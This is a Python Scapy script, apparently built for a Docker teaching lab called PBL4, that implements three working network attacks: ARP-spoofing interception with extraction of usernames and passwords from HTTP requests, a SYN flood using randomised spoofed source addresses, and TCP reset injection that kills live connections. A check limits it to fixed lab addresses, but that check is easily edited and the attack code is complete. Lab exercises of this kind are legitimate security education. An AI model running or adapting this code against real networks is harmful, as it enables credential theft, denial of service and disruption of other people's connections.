#!/usr/bin/env python3
"""Packet-level workers restricted to the fixed PBL4 Docker lab."""

import argparse
import json
import re
import signal
import time
from urllib.parse import parse_qs

from scapy.all import (
    ARP,
    IP,
    TCP,
    Raw,
    Ether,
    RandIP,
    RandShort,
    AsyncSniffer,
    getmacbyip,
    sendp,
    sniff,
)


running = True


def emit(event_type, **values):
    print(json.dumps({"type": event_type, **values}, ensure_ascii=False), flush=True)


def stop_worker(_signum, _frame):
    global running
    running = False


def validate_lab(args):
    if args.client != "172.20.0.10" or args.server != "172.20.0.20":
        raise ValueError("Worker is restricted to the PBL4 lab addresses")
    if args.interface != "eth0":
        raise ValueError("Worker is restricted to eth0 inside hacker_node")
    if args.port not in (8080, 9000):
        raise ValueError("Port must be 8080 or 9000")
    if not 1 <= args.rate <= 1000:
        raise ValueError("Rate must be between 1 and 1000 packets per second")


def extract_credentials(payload):
    text = payload.decode("utf-8", errors="ignore")
    user_match = re.search(r'"username"\s*:\s*"([^"\r\n]{1,128})"', text)
    pass_match = re.search(r'"password"\s*:\s*"([^"\r\n]{1,128})"', text)
    if user_match and pass_match:
        return user_match.group(1), pass_match.group(1)

    if "username=" in text and "password=" in text:
        form = parse_qs(text.split("\r\n\r\n", 1)[-1], keep_blank_values=True)
        if form.get("username") and form.get("password"):
            return form["username"][0][:128], form["password"][0][:128]
    return None


def run_arp(args):
    client_mac = getmacbyip(args.client)
    server_mac = getmacbyip(args.server)
    if not client_mac or not server_mac:
        raise RuntimeError("Could not resolve Client/Server MAC address")

    seen_credentials = set()

    def inspect(packet):
        if not packet.haslayer(IP) or not packet.haslayer(TCP) or not packet.haslayer(Raw):
            return
        if packet[IP].src != args.client or packet[IP].dst != args.server:
            return
        credentials = extract_credentials(bytes(packet[Raw].load))
        if not credentials or credentials in seen_credentials:
            return
        seen_credentials.add(credentials)
        emit(
            "credentials",
            username=credentials[0],
            password=credentials[1],
            src=f"{packet[IP].src}:{packet[TCP].sport}",
            dst=f"{packet[IP].dst}:{packet[TCP].dport}",
        )

    emit("ready", message="[ARP-SPOOF] Worker ready; forwarding traffic through hacker_node")
    sniffer = AsyncSniffer(
        iface=args.interface,
        filter=f"tcp and src host {args.client} and dst host {args.server} and dst port 8080",
        prn=inspect,
        store=False,
    )
    sniffer.start()
    time.sleep(0.2)
    first_poison = True
    try:
        while running:
            sendp(
                Ether(dst=client_mac) / ARP(op=2, pdst=args.client, hwdst=client_mac, psrc=args.server),
                iface=args.interface,
                verbose=False,
            )
            sendp(
                Ether(dst=server_mac) / ARP(op=2, pdst=args.server, hwdst=server_mac, psrc=args.client),
                iface=args.interface,
                verbose=False,
            )
            if first_poison:
                emit("arp", message="[ARP-SPOOF] Client và Server đang nhận ánh xạ MAC của hacker_node")
                first_poison = False
            time.sleep(1.8)
    finally:
        if sniffer.running:
            sniffer.stop()
        sendp(
            Ether(dst=client_mac, src=server_mac)
            / ARP(op=2, pdst=args.client, hwdst=client_mac, psrc=args.server, hwsrc=server_mac),
            iface=args.interface,
            count=5,
            verbose=False,
        )
        sendp(
            Ether(dst=server_mac, src=client_mac)
            / ARP(op=2, pdst=args.server, hwdst=server_mac, psrc=args.client, hwsrc=client_mac),
            iface=args.interface,
            count=5,
            verbose=False,
        )


def run_syn(args):
    server_mac = getmacbyip(args.server)
    if not server_mac:
        raise RuntimeError("Could not resolve Target Server MAC address")
    sent = 0
    last_report = time.monotonic()
    delay = 1 / args.rate
    emit("ready", message=f"[SYN-FLOOD] Worker ready at {args.rate} packets/s")
    while running:
        packet = IP(src=str(RandIP()), dst=args.server) / TCP(
            sport=RandShort(), dport=args.port, flags="S"
        )
        sendp(Ether(dst=server_mac) / packet, iface=args.interface, verbose=False)
        sent += 1
        now = time.monotonic()
        if now - last_report >= 1:
            emit("progress", sent=sent)
            last_report = now
        time.sleep(delay)


def run_rst(args):
    injected = set()
    emit("ready", message="[TCP-RST] Đang theo dõi kết nối TCP trong cyber_net")

    def inject(packet):
        if not packet.haslayer(IP) or not packet.haslayer(TCP):
            return
        tcp = packet[TCP]
        if int(tcp.flags) & 0x04:
            return
        if not int(tcp.flags) & 0x10:
            return
        flow = (packet[IP].src, tcp.sport, packet[IP].dst, tcp.dport)
        if flow in injected:
            return
        injected.add(flow)

        payload_len = len(bytes(packet[Raw].load)) if packet.haslayer(Raw) else 0
        control_advance = 1 if int(tcp.flags) & 0x03 else 0
        forward_seq = int(tcp.seq) + payload_len + control_advance
        forward = IP(src=packet[IP].src, dst=packet[IP].dst) / TCP(
            sport=tcp.sport, dport=tcp.dport, flags="R", seq=forward_seq
        )
        reverse = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(
            sport=tcp.dport, dport=tcp.sport, flags="R", seq=int(tcp.ack)
        )
        forward_mac = getmacbyip(packet[IP].dst)
        reverse_mac = getmacbyip(packet[IP].src)
        if not forward_mac or not reverse_mac:
            return
        sendp(Ether(dst=forward_mac) / forward, iface=args.interface, verbose=False)
        sendp(Ether(dst=reverse_mac) / reverse, iface=args.interface, verbose=False)
        emit(
            "rst",
            src=f"{packet[IP].src}:{tcp.sport}",
            dst=f"{packet[IP].dst}:{tcp.dport}",
            sport=int(tcp.sport),
            dport=int(tcp.dport),
            seq=forward_seq,
        )

    while running:
        sniff(
            iface=args.interface,
            filter=(
                f"tcp and host {args.client} and host {args.server} "
                f"and port {args.port}"
            ),
            prn=inject,
            store=False,
            timeout=1,
        )


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("mode", choices=("arp", "syn", "rst"))
    parser.add_argument("--interface", required=True)
    parser.add_argument("--client", required=True)
    parser.add_argument("--server", required=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--rate", type=int, default=100)
    args = parser.parse_args()
    validate_lab(args)

    signal.signal(signal.SIGTERM, stop_worker)
    signal.signal(signal.SIGINT, stop_worker)

    if args.mode == "arp":
        run_arp(args)
    elif args.mode == "syn":
        run_syn(args)
    else:
        run_rst(args)


if __name__ == "__main__":
    try:
        main()
    except Exception as error:
        emit("error", message=str(error))
        raise
